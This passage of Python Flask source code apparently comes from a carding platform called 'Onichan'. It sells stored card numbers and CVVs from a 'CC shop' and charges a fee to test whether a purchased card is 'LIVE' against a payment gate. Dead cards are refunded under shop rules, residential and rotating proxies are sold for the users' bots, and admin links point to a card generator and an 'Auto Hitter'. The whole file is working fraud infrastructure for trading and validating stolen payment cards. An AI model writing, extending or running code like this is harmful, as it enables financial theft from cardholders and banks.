        if dep:
            amount = float(dep['amount'])
            user_id = dep['user_id']
            add_user_balance(user_id, amount)
            _execute_with_retry(
                "UPDATE cc_shop_deposits SET status = 'confirmed', confirmed_at = NOW() WHERE id = %s",
                (dep['id'],)
            )
            print(f"[Shop Callback] Deposit confirmed: ${amount} for user {user_id}")
    elif status in ('expired', 'failed', 'canceled'):
        from modules.database import _execute_with_retry
        _execute_with_retry(
            "UPDATE cc_shop_deposits SET status = %s WHERE track_id = %s AND status = 'pending'",
            (status, str(track_id))
        )

    return jsonify({'status': 'ok'})


# ─── CC SHOP API ROUTES ─────────────────────────────────────────────────────

@app.route('/api/shop/check', methods=['POST'])
@user_required
def api_shop_check():
    from modules.gate_checker import check_card_php
    from modules.cc_shop import _xor_decrypt
    from modules.database import _execute_with_retry
    user_id = session.get('user_id')
    data = request.get_json() or {}
    purchase_id = data.get('purchase_id')
    if not purchase_id:
        return jsonify({'status': 'error', 'message': 'Missing purchase ID'})
    try:
        purchase_id = int(purchase_id)
    except:
        return jsonify({'status': 'error', 'message': 'Invalid purchase ID'})
    row = _execute_with_retry(
        """SELECT s.cc_number, s.mm, s.yy, s.cvv, s.bank, p.refunded, p.purchased_at, p.refund_denial_reason
           FROM cc_shop_purchases p
           JOIN cc_shop_stock s ON p.card_id = s.id
           WHERE p.id = %s AND p.user_id = %s""",
        (purchase_id, user_id), fetch_one=True
    )
    if not row:
        return jsonify({'status': 'error', 'message': 'Purchase not found'})

    CHECK_FEE = 0.20
    from modules.cc_shop import get_user_balance, add_user_balance
    balance = get_user_balance(user_id)
    if balance < CHECK_FEE:
        return jsonify({'status': 'error', 'message': f'Insufficient balance. Checking costs ${CHECK_FEE:.2f}, you have ${balance:.2f}'})
    add_user_balance(user_id, -CHECK_FEE)

    cc_num = _xor_decrypt(row['cc_number'])
    cvv_val = _xor_decrypt(row['cvv'])
    mm = row['mm']
    yy = row['yy']
    try:
        check_result = check_card_php('se1', cc_num, mm, yy, cvv_val, user_id)
        status = (check_result.get('status') or '').lower()
        is_live = status == 'approved'

        if is_live:
            return jsonify({'status': 'live', 'message': 'Card is LIVE ✅'})
        else:
            refund_msg = ''
            if not row.get('refunded'):
                refund_result = refund_purchase(purchase_id, user_id)
                if refund_result.get('success'):
                    amt = refund_result['refund_amount']
                    fee = refund_result['fee']
                    if amt > 0:
                        refund_msg = f' | Refunded ${amt:.2f}'
                        if fee > 0:
                            refund_msg += f' (fee: ${fee:.2f})'
                    else:
                        refund_msg = ' | No refund (admin policy)'
                elif refund_result.get('denied'):
                    reason = refund_result.get('error', '')
                    if reason == 'non_refundable_bank':
                        bank = refund_result.get('bank', 'this bank')
                        refund_msg = f' | No refund ({bank} is non-refundable)'
                    elif reason == 'window_expired':
                        wmin = refund_result.get('window_minutes', 5)
                        refund_msg = f' | Refund window expired ({wmin}min limit)'
                    else:
                        refund_msg = ' | Refund denied'
                else:
                    refund_msg = f' | {refund_result.get("error", "Refund failed")}'
            else:
                denial = row.get('refund_denial_reason', '')
                if denial == 'non_refundable_bank':
                    refund_msg = ' | Non-refundable bank'
                elif denial == 'window_expired':
                    refund_msg = ' | Refund window was expired'
                else:
                    refund_msg = ' | Already refunded'
            gate_msg = check_result.get('message', '')
            return jsonify({'status': 'dead', 'message': f'Card is DEAD{refund_msg}', 'gate_response': gate_msg})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)[:100]})

@app.route('/api/shop/balance')
@user_required
def api_shop_balance():
    user_id = session.get('user_id')
    balance = get_user_balance(user_id)
    return jsonify({'balance': balance})


# ─── PROXY SHOP (User) ───────────────────────────────────────────────────────

from modules.proxy_shop import (
    get_proxy_plans, get_proxy_plan, purchase_proxy,
    get_user_proxy_purchases, get_proxy_purchase, format_proxy_string,
    get_proxy_shop_stats, add_proxy_server, get_proxy_servers, get_proxy_server,
    delete_proxy_server, update_proxy_server,
    create_proxy_plan as create_plan, update_proxy_plan, delete_proxy_plan,
    get_all_proxy_purchases, expire_old_purchases, cancel_proxy_purchase,
    bandwidth_meter_data, PROXY_TYPES, PROXY_CATEGORIES, SOURCE_TYPES,
    refresh_rotating_proxies, get_proxy_list
)
from modules.proxy_nodes import (
    add_node, update_node, delete_node, get_nodes, get_node,
    get_node_proxy_ports, generate_deploy_script, sync_node_credentials
)
from modules.proxy_scraper_engine import (
    get_pool_stats, get_pool_proxies, get_scrape_sources, add_scrape_source,
    toggle_scrape_source, delete_scrape_source, get_scrape_history
)

@app.route('/user/proxyshop')
@user_required
def user_proxyshop():
    user_id = session.get('user_id')
    balance = get_user_balance(user_id)
    selected_type = request.args.get('type', '')
    selected_country = request.args.get('country', '')
    selected_category = request.args.get('cat', '')
    plans = get_proxy_plans(
        proxy_type=selected_type if selected_type else None,
        country=selected_country if selected_country else None,
        category=selected_category if selected_category else None
    )

    def _qs(**overrides):
        parts = {}
        if selected_type:
            parts['type'] = selected_type
        if selected_country:
            parts['country'] = selected_country
        if selected_category:
            parts['cat'] = selected_category
        parts.update(overrides)
        parts = {k: v for k, v in parts.items() if v}
        return '?' + '&'.join(f'{k}={_h(v)}' for k, v in parts.items()) if parts else ''

    cat_tabs = ''
    cat_labels = {'': 'All', 'residential': 'Residential', 'rotating': 'Rotating', 'datacenter': 'Datacenter', 'premium': 'Premium'}
    for cat_val, cat_label in cat_labels.items():
        active_style = 'background:#ff1493;color:#fff;' if selected_category == cat_val else ''
        cat_tabs += f'<a href="/user/proxyshop{_qs(cat=cat_val)}" class="proxy-tab" style="{active_style}">{cat_label}</a>'

    type_tabs = ''
    type_labels = {'': 'All Types'}
    type_labels.update({t: t for t in PROXY_TYPES})
    for t_val, t_label in type_labels.items():
        active_style = 'background:#6366f1;color:#fff;' if selected_type == t_val else ''
        type_tabs += f'<a href="/user/proxyshop{_qs(type=t_val)}" class="proxy-tab" style="{active_style}">{t_label}</a>'

    all_plans_for_countries = get_proxy_plans(active_only=True)
    countries = sorted(set(
        (p.get('country', '') or '').strip()
        for p in all_plans_for_countries
        if (p.get('country', '') or '').strip()
    ))
    country_select = ''
    if countries:
        opts = f'<option value="">All Countries</option>'
        for c in countries:
            sel = 'selected' if c.lower() == selected_country.lower() else ''
            opts += f'<option value="{_h(c)}" {sel}>{_h(c)}</option>'
        country_select = f'''<select onchange="window.location.href='/user/proxyshop{_qs(country='__VAL__')}'.replace('__VAL__',this.value)" style="padding:8px 14px;background:rgba(255,255,255,0.08);border:1px solid rgba(255,105,180,0.3);border-radius:20px;color:#fff;font-size:0.9em;cursor:pointer;">{opts}</select>'''

    plans_html = ""
    for p in plans:
        bw = float(p.get('bandwidth_gb', 0))
        price = float(p.get('price', 0))
        duration = int(p.get('duration_days', 30) or 30)
        desc = _h(p.get('description', '') or '')
        country_label = _h(p.get('country', '') or '')
        country_badge = f'<span style="font-size:0.75em;opacity:0.7;margin-left:6px;">{country_label}</span>' if country_label else ''
        category = (p.get('category', '') or 'datacenter').capitalize()
        cat_color = '#22d3ee' if category.lower() == 'residential' else '#a78bfa' if category.lower() == 'rotating' else '#fb923c' if category.lower() == 'premium' else '#94a3b8'
        plans_html += f"""
        <div class="proxy-plan-card">
            <div class="proxy-plan-header">
                <div>
                    <span class="proxy-type-badge">{_h(p['proxy_type'])}</span>
                    <span style="background:{cat_color};padding:3px 10px;border-radius:20px;font-size:0.7em;font-weight:700;margin-left:4px;">{category}</span>
                </div>
                <span class="proxy-plan-price">${price:.2f}</span>
            </div>
            <h3 class="proxy-plan-name">{_h(p['name'])}{country_badge}</h3>
            <div class="proxy-plan-bw">{'Unlimited' if bw == 0 else f'{bw:.0f} GB'} Bandwidth</div>
            <p class="proxy-plan-desc">{desc}</p>
            <div class="proxy-plan-features">
                <div>{duration} Days Duration</div>
                <div>Instant Activation</div>
                <div>{'VPS Node' if p.get('source_type','vps') == 'vps' else 'Proxy Pool'} Source</div>
                <div>Unique Credentials Per Purchase</div>
            </div>
            <form method="POST" action="/user/proxyshop/buy">
                <input type="hidden" name="plan_id" value="{p['id']}">
                <button type="submit" class="proxy-buy-btn" onclick="return confirm('Buy {_h(p['name'])} for ${price:.2f}?')">Purchase</button>
            </form>
        </div>"""

    sidebar = get_user_sidebar('proxyshop', 'Proxy Shop')
    no_plans_msg = '<p style="text-align:center;opacity:0.5;grid-column:1/-1;padding:40px;">No proxy plans available yet. Check back later!</p>'

    return render_template_string(f"""
    <html>
    <head><title>Proxy Shop - Onichan</title>{USER_CSS}
    <style>
        .balance-bar {{
            background: linear-gradient(135deg, rgba(255,20,147,0.2), rgba(218,112,214,0.2));
            border: 1px solid rgba(255,105,180,0.3);
            border-radius: 12px;
            padding: 15px 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
        }}
        .balance-amount {{ font-size: 1.5em; font-weight: 700; color: #ff69b4; }}
        .proxy-tabs {{
            display: flex; gap: 8px; margin-bottom: 12px; flex-wrap: wrap;
        }}
        .proxy-tab {{
            padding: 8px 18px; border-radius: 20px;
            background: rgba(255,255,255,0.08);
            border: 1px solid rgba(255,105,180,0.3);
            color: #fff; text-decoration: none; font-size: 0.9em; font-weight: 600;
            transition: all 0.3s ease;
        }}
        .proxy-tab:hover {{ border-color: #ff69b4; }}
        .proxy-grid {{
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
            gap: 18px;
        }}
        .proxy-plan-card {{
            background: rgba(255,255,255,0.06);
            border: 1px solid rgba(255,105,180,0.2);
            border-radius: 14px;
            padding: 20px;
            transition: all 0.3s ease;
            display: flex; flex-direction: column;
        }}
        .proxy-plan-card:hover {{
            border-color: rgba(255,105,180,0.5);
            transform: translateY(-4px);
            box-shadow: 0 10px 30px rgba(255,20,147,0.15);
        }}
        .proxy-plan-header {{
            display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px;
        }}
        .proxy-type-badge {{
            background: linear-gradient(135deg, #6366f1, #8b5cf6);
            padding: 4px 12px; border-radius: 20px; font-size: 0.75em; font-weight: 700;
        }}
        .proxy-plan-price {{ font-size: 1.4em; font-weight: 700; color: #4ade80; }}
        .proxy-plan-name {{ font-size: 1.1em; margin: 5px 0; color: #ff69b4; }}
        .proxy-plan-bw {{
            font-size: 0.95em; opacity: 0.8; margin-bottom: 8px;
            padding: 6px 0; border-bottom: 1px solid rgba(255,255,255,0.08);
        }}
        .proxy-plan-desc {{ font-size: 0.85em; opacity: 0.6; margin-bottom: 12px; }}
        .proxy-plan-features {{
            font-size: 0.8em; opacity: 0.7; margin-bottom: 15px; flex-grow: 1;
        }}
        .proxy-plan-features div {{ padding: 3px 0; }}
        .proxy-plan-features div::before {{ content: "\\2713 "; color: #4ade80; }}
        .proxy-buy-btn {{
            width: 100%; padding: 12px;
            background: linear-gradient(135deg, #ff1493, #ff69b4);
            border: none; border-radius: 10px; color: #fff; font-weight: 700;
            cursor: pointer; font-size: 0.95em; transition: all 0.3s ease;
        }}
        .proxy-buy-btn:hover {{
            transform: scale(1.02);
            box-shadow: 0 4px 15px rgba(255,20,147,0.4);
        }}
    </style>
    </head>
    <body>
        {sidebar}
        <div class="main">
            <div class="header"><h1>Proxy Shop</h1></div>
            <div class="balance-bar">
                <span>Your Balance</span>
                <span class="balance-amount">${balance:.2f}</span>
                <a href="/user/ccshop/deposit" style="margin-left:15px;padding:6px 16px;background:linear-gradient(135deg,#ff69b4,#ff1493);border-radius:8px;color:#fff;text-decoration:none;font-size:0.85em;font-weight:600;">+ Add Funds</a>
            </div>
            <div class="proxy-tabs">{cat_tabs}</div>
            <div class="proxy-tabs" style="display:flex;align-items:center;gap:8px;flex-wrap:wrap;">{type_tabs}{country_select}</div>
            <div class="proxy-grid">
                {plans_html if plans_html else no_plans_msg}
            </div>
        </div>
    </body>
    </html>
    """)


@app.route('/user/proxyshop/buy', methods=['POST'])
@user_required
def user_proxyshop_buy():
    user_id = session.get('user_id')
    plan_id = request.form.get('plan_id', 0, type=int)
    if not plan_id:
        return redirect('/user/proxyshop')

    result = purchase_proxy(user_id, plan_id)
    if result.get('error'):
        return render_template_string(f"""
        <html>
        <head><title>Purchase Failed - Onichan</title>{USER_CSS}</head>
        <body>
            {get_user_sidebar('proxyshop', 'Proxy Shop')}
            <div class="main">
                <div class="card" style="text-align:center;padding:40px;">
                    <h2 style="color:#ef4444;">Purchase Failed</h2>
                    <p style="margin:15px 0;">{_h(result['error'])}</p>
                    <a href="/user/proxyshop" style="text-decoration:none;padding:10px 25px;background:#ff1493;border-radius:8px;color:#fff;display:inline-block;margin-top:10px;">Back to Shop</a>
                </div>
            </div>
        </body>
        </html>
        """)

    from modules.user_config import set_user_proxy as save_user_proxy_config
    proxy_str = f"{result['proxy_host']}:{result['proxy_port']}:{result['proxy_user']}:{result['proxy_pass']}"
    try:
        save_user_proxy_config(user_id, proxy_str)
    except:
        pass

    return render_template_string(f"""
    <html>
    <head><title>Purchase Complete - Onichan</title>{USER_CSS}
    <style>
        .success-box {{
            background: linear-gradient(135deg, rgba(34,197,94,0.15), rgba(16,185,129,0.15));
            border: 1px solid rgba(34,197,94,0.3);
            border-radius: 14px;
            padding: 30px;
            text-align: center;
        }}
        .cred-box {{
            background: rgba(0,0,0,0.4);
            border-radius: 10px;
            padding: 15px;
            margin: 15px 0;
            text-align: left;
            font-family: monospace;
        }}
        .cred-row {{
            display: flex; justify-content: space-between; padding: 6px 0;
            border-bottom: 1px solid rgba(255,255,255,0.06);
        }}
        .cred-row:last-child {{ border-bottom: none; }}
        .cred-label {{ opacity: 0.6; }}
        .cred-value {{ color: #4ade80; }}
    </style>
    </head>
    <body>
        {get_user_sidebar('proxyshop', 'Proxy Shop')}
        <div class="main">
            <div class="success-box">
                <h2 style="color:#22c55e;">✅ Purchase Successful!</h2>
                <p style="opacity:0.7;margin:10px 0;">Your proxy is ready to use</p>
                <div class="cred-box">
                    <div class="cred-row"><span class="cred-label">Type</span><span class="cred-value">{_h(result['proxy_type'])}</span></div>
                    <div class="cred-row"><span class="cred-label">Host</span><span class="cred-value">{_h(result['proxy_host'])}</span></div>
                    <div class="cred-row"><span class="cred-label">Port</span><span class="cred-value">{result['proxy_port']}</span></div>
                    <div class="cred-row"><span class="cred-label">Username</span><span class="cred-value">{_h(result['proxy_user'])}</span></div>
                    <div class="cred-row"><span class="cred-label">Password</span><span class="cred-value">{_h(result['proxy_pass'])}</span></div>
                    <div class="cred-row"><span class="cred-label">Bandwidth</span><span class="cred-value">{result['bandwidth_gb']:.0f} GB</span></div>
                    <div class="cred-row"><span class="cred-label">Expires</span><span class="cred-value">{_h(result['expires_at'])}</span></div>
                    <div class="cred-row"><span class="cred-label">Price</span><span class="cred-value">${result['price']:.2f}</span></div>
                    <div class="cred-row"><span class="cred-label">New Balance</span><span class="cred-value">${result['new_balance']:.2f}</span></div>
                </div>
                <div style="margin-top:10px;">
                    <code style="background:rgba(0,0,0,0.5);padding:8px 14px;border-radius:6px;display:inline-block;" id="proxyStr">{_h(proxy_str)}</code>
                    <button onclick="navigator.clipboard.writeText(document.getElementById('proxyStr').textContent);this.textContent='Copied!';setTimeout(()=>this.textContent='Copy',1500);" style="margin-left:8px;padding:6px 14px;background:#ff69b4;border:none;border-radius:6px;color:#fff;cursor:pointer;">Copy</button>
                </div>
                <p style="font-size:0.8em;opacity:0.5;margin-top:12px;">This proxy has also been saved to your bot proxy list.</p>
                <div style="margin-top:20px;display:flex;gap:10px;justify-content:center;">
                    <a href="/user/myproxies" style="text-decoration:none;padding:10px 25px;background:#6366f1;border-radius:8px;color:#fff;font-weight:600;">My Proxies</a>
                    <a href="/user/proxyshop" style="text-decoration:none;padding:10px 25px;background:#ff1493;border-radius:8px;color:#fff;font-weight:600;">Buy More</a>
                </div>
            </div>
        </div>
    </body>
    </html>
    """)


@app.route('/user/proxy-refresh', methods=['POST'])
@user_required
def user_proxy_refresh():
    user_id = session.get('user_id')
    purchase_id = request.form.get('purchase_id', 0, type=int)
    if purchase_id:
        p = get_proxy_purchase(purchase_id)
        if p and p.get('user_id') == user_id:
            refresh_rotating_proxies(purchase_id)
    return redirect('/user/myproxies')


@app.route('/user/myproxies')
@user_required
def user_myproxies():
    user_id = session.get('user_id')
    expire_old_purchases()
    page = request.args.get('page', 1, type=int)
    data = get_user_proxy_purchases(user_id, page=page, per_page=20)

    proxies_html = ""
    for p in data['purchases']:
        status = p.get('status', 'active')
        st_color = '#4ade80' if status == 'active' else '#ef4444' if status == 'expired' else '#f59e0b'
        st_label = status.upper()
        bm = bandwidth_meter_data(p)
        proxy_str = format_proxy_string(p)
        proxy_list = get_proxy_list(p)
        is_rotating = (p.get('plan_category', '') or '').lower() == 'rotating'
        is_pool = (p.get('source_type', '') or '') == 'pool'
        has_list = len(proxy_list) > 1
        expires = str(p.get('expires_at', ''))[:16]
        purchased = str(p.get('purchased_at', ''))[:16]
        category = _h((p.get('plan_category', '') or 'datacenter').capitalize())

        list_html = ''
        if has_list:
            list_items = ''.join(f'<div style="padding:4px 8px;background:rgba(0,0,0,0.3);border-radius:6px;margin:3px 0;font-family:monospace;font-size:0.8em;">{_h(px)}</div>' for px in proxy_list)
            copy_all = '\\n'.join(proxy_list)
            list_html = f"""
            <div style="margin-top:12px;">
                <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">
                    <span style="font-weight:600;font-size:0.85em;">Proxy List ({len(proxy_list)} proxies)</span>
                    <button class="copy-btn" onclick="navigator.clipboard.writeText(`{_h(copy_all)}`);this.textContent='Copied All!';setTimeout(()=>this.textContent='Copy All',1500);">Copy All</button>
                </div>
                {list_items}
            </div>"""

        refresh_btn = ''
        if status == 'active' and is_pool:
            refresh_btn = f'''<form method="POST" action="/user/proxy-refresh" style="display:inline;margin-left:8px;">
                <input type="hidden" name="purchase_id" value="{p['id']}">
                <button type="submit" class="btn btn-sm" style="padding:4px 12px;font-size:0.75em;background:#22d3ee;">Refresh List</button>
            </form>'''

        proxies_html += f"""
        <div class="proxy-purchase-card">
            <div class="proxy-purchase-header">
                <div>
                    <span class="proxy-type-badge">{_h(p.get('proxy_type',''))}</span>
                    <span style="background:rgba(99,102,241,0.3);padding:3px 8px;border-radius:10px;font-size:0.7em;font-weight:600;margin-left:4px;">{category}</span>
                    <span style="color:{st_color};font-size:0.8em;font-weight:700;margin-left:8px;">{st_label}</span>
                    {refresh_btn}
                </div>
                <span style="font-size:0.8em;opacity:0.6;">{purchased}</span>
            </div>
            <h3 style="color:#ff69b4;margin:8px 0;font-size:1em;">{_h(p.get('plan_name','') or 'Proxy Plan')}</h3>
            <div class="proxy-cred-box">
                <code id="proxy-{p['id']}">{_h(proxy_str)}</code>
                <button class="copy-btn" onclick="navigator.clipboard.writeText(document.getElementById('proxy-{p['id']}').textContent);this.textContent='Copied!';setTimeout(()=>this.textContent='Copy',1500);">Copy</button>
            </div>
            {list_html}
            <div class="proxy-details">
                <div class="proxy-detail-row"><span>Host</span><span>{_h(p.get('proxy_host',''))}</span></div>
                <div class="proxy-detail-row"><span>Port</span><span>{p.get('proxy_port',0)}</span></div>
                <div class="proxy-detail-row"><span>Username</span><span>{_h(p.get('proxy_user',''))}</span></div>
                <div class="proxy-detail-row"><span>Password</span><span>{_h(p.get('proxy_pass',''))}</span></div>
                <div class="proxy-detail-row"><span>Expires</span><span>{expires}</span></div>
            </div>
            <div class="bw-meter">
                <div class="bw-meter-header">
                    <span style="font-weight:600;">Bandwidth Meter</span>
                    <span style="color:{bm['color']};font-weight:700;">{_h(bm['label'])}</span>
                </div>
                <div class="bw-meter-track">
                    <div class="bw-meter-fill" style="width:{0 if bm['unlimited'] else int(bm['percent'])}%;background:{bm['color']};"></div>
                </div>
                <div class="bw-meter-footer">
                    <span>{'Unlimited Plan' if bm['unlimited'] else f"Purchased: {bm['total']:.0f} GB"}</span>
                    <span>{'Used: ' + f"{bm['used']:.2f} GB" if bm['unlimited'] else f"Remaining: {bm['remaining']:.2f} GB"}</span>
                </div>
            </div>
        </div>"""

    pagination = ""
    if data['pages'] > 1:
        for pg in range(1, data['pages'] + 1):
            active = 'background:#ff1493;color:#fff;' if pg == page else ''
            pagination += f'<a href="/user/myproxies?page={pg}" class="btn btn-sm" style="padding:5px 12px;margin:2px;border-radius:6px;text-decoration:none;{active}">{pg}</a>'

    return render_template_string(f"""
    <html>
    <head><title>My Proxies - Onichan</title>{USER_CSS}
    <style>
        .proxy-purchase-card {{
            background: rgba(255,255,255,0.06);
            border: 1px solid rgba(255,105,180,0.2);
            border-radius: 14px;
            padding: 18px;
            margin-bottom: 15px;
        }}
        .proxy-purchase-header {{
            display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px;
        }}
        .proxy-type-badge {{
            background: linear-gradient(135deg, #6366f1, #8b5cf6);
            padding: 4px 12px; border-radius: 20px; font-size: 0.75em; font-weight: 700;
        }}
        .proxy-cred-box {{
            background: rgba(0,0,0,0.4);
            border-radius: 8px;
            padding: 10px 14px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin: 10px 0;
            font-family: monospace;
            font-size: 0.9em;
        }}
        .copy-btn {{
            background: #ff69b4; border: none; padding: 5px 12px;
            border-radius: 6px; color: #fff; cursor: pointer; font-size: 0.8em;
        }}
        .proxy-details {{
            font-size: 0.85em; margin: 10px 0;
        }}
        .proxy-detail-row {{
            display: flex; justify-content: space-between; padding: 4px 0;
            border-bottom: 1px solid rgba(255,255,255,0.05);
        }}
        .proxy-detail-row:last-child {{ border-bottom: none; }}
        .proxy-detail-row span:first-child {{ opacity: 0.6; }}
        .bw-meter {{
            margin-top: 15px;
            background: rgba(0,0,0,0.3);
            border-radius: 10px;
            padding: 12px 15px;
            border: 1px solid rgba(255,105,180,0.15);
        }}
        .bw-meter-header {{
            display: flex; justify-content: space-between; font-size: 0.85em; margin-bottom: 8px;
        }}
        .bw-meter-track {{
            background: rgba(255,255,255,0.1);
            border-radius: 8px;
            height: 12px;
            overflow: hidden;
        }}
        .bw-meter-fill {{
            height: 100%;
            border-radius: 8px;
            transition: width 0.5s ease;
        }}
        .bw-meter-footer {{
            display: flex; justify-content: space-between; font-size: 0.75em; margin-top: 6px; opacity: 0.6;
        }}
    </style>
    </head>
    <body>
        {get_user_sidebar('myproxies', 'My Proxies')}
        <div class="main">
            <div class="header"><h1>My Proxies</h1><span style="opacity:0.7;">{data['total']} purchases</span></div>
            {proxies_html if proxies_html else '<div class="card" style="text-align:center;padding:40px;"><p style="opacity:0.5;">No proxy purchases yet</p><a href="/user/proxyshop" style="text-decoration:none;padding:10px 25px;background:#ff1493;border-radius:8px;color:#fff;display:inline-block;margin-top:15px;">Browse Proxy Shop</a></div>'}
            <div style="margin-top:15px;display:flex;gap:5px;flex-wrap:wrap;justify-content:center;">{pagination}</div>
        </div>
    </body>
    </html>
    """)


# ─── PROXY SHOP (Admin) ─────────────────────────────────────────────────────

def _admin_proxy_sidebar(active='proxyshop'):
    def cls(key):
        return 'class="active"' if key == active else ''
    return f"""
        <button class="menu-toggle" onclick="toggleSidebar()"><span></span><span></span><span></span></button>
        <div class="sidebar-overlay" onclick="closeSidebar()"></div>
        <div class="sidebar">
            <h2>Onichan Admin</h2>
            <a href="/admin" onclick="closeSidebar()">Dashboard</a>
            <a href="/admin/users" onclick="closeSidebar()">Users</a>
            <a href="/admin/owners" onclick="closeSidebar()">Admins</a>
            <a href="/admin/permissions" onclick="closeSidebar()">Permissions</a>
            <a href="/admin/premium" onclick="closeSidebar()">Premium</a>
            <a href="/admin/payments" onclick="closeSidebar()">Payments</a>
            <a href="/admin/banned" onclick="closeSidebar()">Banned</a>
            <a href="/admin/cards" onclick="closeSidebar()">Approved Cards</a>
            <hr style="border-color: rgba(255,255,255,0.1); margin: 10px 0;">
            <a href="/tools/checker" onclick="closeSidebar()">CC Checker</a>
            <a href="/tools/generator" onclick="closeSidebar()">Generator</a>
            <a href="/admin/autohitter" onclick="closeSidebar()">Auto Hitter</a>
            <a href="/tools/cleaner" onclick="closeSidebar()">CC Cleaner</a>
            <hr style="border-color: rgba(255,255,255,0.1); margin: 10px 0;">
            <a href="/admin/ccshop" onclick="closeSidebar()">CC Shop</a>
            <a href="/admin/proxyshop" {cls('proxyshop')} onclick="closeSidebar()">Proxy Shop</a>
            <a href="/admin/gates" onclick="closeSidebar()">Gates</a>
            <a href="/admin/settings" onclick="closeSidebar()">Settings</a>
            <a href="/admin/logout" onclick="closeSidebar()">Logout</a>
        </div>
    """


@app.route('/admin/proxyshop')
@admin_required
def admin_proxyshop():
    expire_old_purchases()
    stats = get_proxy_shop_stats()
    plans = get_proxy_plans(active_only=False)
    servers = get_proxy_servers(active_only=False)
    nodes = get_nodes(active_only=False)
    pool = get_pool_stats()
    page = request.args.get('page', 1, type=int)
    purchases = get_all_proxy_purchases(page=page, per_page=30)

    _fi = 'padding:5px;background:rgba(255,255,255,0.1);border:1px solid rgba(255,255,255,0.2);border-radius:4px;color:#fff;'
    _fi2 = 'padding:8px;background:rgba(255,255,255,0.1);border:1px solid rgba(255,255,255,0.2);border-radius:6px;color:#fff;'

    cat_options = ''.join([f'<option value="{c}">{c.capitalize()}</option>' for c in PROXY_CATEGORIES])
    src_options = ''.join([f'<option value="{s}">{s.upper()}</option>' for s in SOURCE_TYPES])
    type_options = ''.join([f'<option value="{t}">{t}</option>' for t in PROXY_TYPES])

    plans_html = ""
    for p in plans:
        active_cls = 'color:#4ade80;' if p.get('active') else 'color:#ef4444;'
        active_txt = 'Active' if p.get('active') else 'Disabled'
        duration = int(p.get('duration_days', 30) or 30)
        country = _h(p.get('country', '') or '-')
        cat = _h((p.get('category', '') or 'datacenter').capitalize())
        src = _h((p.get('source_type', '') or 'vps').upper())
        plans_html += f"""<tr>
            <td>{p['id']}</td><td>{_h(p['name'])}</td><td>{_h(p['proxy_type'])}</td>
            <td>{float(p['bandwidth_gb']):.0f} GB</td><td>${float(p['price']):.2f}</td>
            <td>{duration}d</td><td>{country}</td><td>{cat}</td><td>{src}</td>
            <td style="{active_cls}font-weight:700;">{active_txt}</td>
            <td style="white-space:nowrap;">
                <form method="POST" action="/admin/proxyshop/toggle-plan" style="display:inline;"><input type="hidden" name="plan_id" value="{p['id']}"><input type="hidden" name="active" value="{'false' if p.get('active') else 'true'}"><button type="submit" class="btn btn-sm" style="padding:3px 8px;font-size:0.75em;">{'Disable' if p.get('active') else 'Enable'}</button></form>
                <button class="btn btn-sm" style="padding:3px 8px;font-size:0.75em;background:#6366f1;" onclick="document.getElementById('edit-plan-{p['id']}').style.display=document.getElementById('edit-plan-{p['id']}').style.display==='none'?'table-row':'none'">Edit</button>
                <form method="POST" action="/admin/proxyshop/delete-plan" style="display:inline;" onsubmit="return confirm('Delete?')"><input type="hidden" name="plan_id" value="{p['id']}"><button type="submit" class="btn btn-sm" style="padding:3px 8px;font-size:0.75em;background:#ef4444;">Del</button></form>
            </td>
        </tr>
        <tr id="edit-plan-{p['id']}" style="display:none;background:rgba(99,102,241,0.1);">
            <td colspan="11">
                <form method="POST" action="/admin/proxyshop/edit-plan" style="display:flex;gap:8px;flex-wrap:wrap;align-items:end;padding:8px;">
                    <input type="hidden" name="plan_id" value="{p['id']}">
                    <div><label style="display:block;font-size:0.7em;opacity:0.6;">Name</label><input type="text" name="name" value="{_h(p['name'])}" style="{_fi}width:120px;"></div>
                    <div><label style="display:block;font-size:0.7em;opacity:0.6;">BW (GB)</label><input type="number" name="bandwidth_gb" step="0.1" value="{float(p['bandwidth_gb'])}" style="{_fi}width:60px;"></div>
                    <div><label style="display:block;font-size:0.7em;opacity:0.6;">Price ($)</label><input type="number" name="price" step="0.01" value="{float(p['price'])}" style="{_fi}width:60px;"></div>
                    <div><label style="display:block;font-size:0.7em;opacity:0.6;">Days</label><input type="number" name="duration_days" value="{duration}" style="{_fi}width:50px;"></div>
                    <div><label style="display:block;font-size:0.7em;opacity:0.6;">Country</label><input type="text" name="country" value="{_h(p.get('country','') or '')}" style="{_fi}width:60px;"></div>
                    <div><label style="display:block;font-size:0.7em;opacity:0.6;">Category</label><select name="category" style="{_fi}">{''.join(f'<option value="{c}"{"selected" if c == p.get("category","") else ""}>{c.capitalize()}</option>' for c in PROXY_CATEGORIES)}</select></div>
                    <div><label style="display:block;font-size:0.7em;opacity:0.6;">Source</label><select name="source_type" style="{_fi}">{''.join(f'<option value="{s}"{"selected" if s == p.get("source_type","") else ""}>{s.upper()}</option>' for s in SOURCE_TYPES)}</select></div>
                    <div><label style="display:block;font-size:0.7em;opacity:0.6;">Desc</label><input type="text" name="description" value="{_h(p.get('description','') or '')}" style="{_fi}width:120px;"></div>
                    <button type="submit" class="btn btn-sm" style="padding:5px 12px;font-size:0.75em;background:#22c55e;">Save</button>
                </form>
            </td>
        </tr>"""

    nodes_html = ""
    for n in nodes:
        st = n.get('status', 'offline')
        st_color = '#4ade80' if st == 'online' else '#ef4444'
        max_bw = float(n.get('max_bandwidth_gb', 0) or 0)
        used_bw = float(n.get('used_bandwidth_gb', 0) or 0)
        bw_disp = f"{used_bw:.0f}/{max_bw:.0f} GB" if max_bw > 0 else f"{used_bw:.0f} GB (Unlim)"
        last_seen = str(n.get('last_seen', '') or 'Never')[:16]
        nodes_html += f"""<tr>
            <td>{n['id']}</td><td>{_h(n.get('label','') or '-')}</td><td>{_h(n['host'])}</td>
            <td>{n.get('api_port',8899)}</td><td>{_h(n.get('country','') or '-')}</td>
            <td>{_h(n.get('protocols',''))}</td><td>{bw_disp}</td>
            <td>{n.get('connected_users',0)}</td>
            <td style="color:{st_color};font-weight:700;">{st.upper()}</td>
            <td>{last_seen}</td>
            <td style="white-space:nowrap;">
                <a href="/admin/proxyshop/node-script/{n['id']}" class="btn btn-sm" style="padding:3px 8px;font-size:0.75em;background:#22d3ee;text-decoration:none;">Script</a>
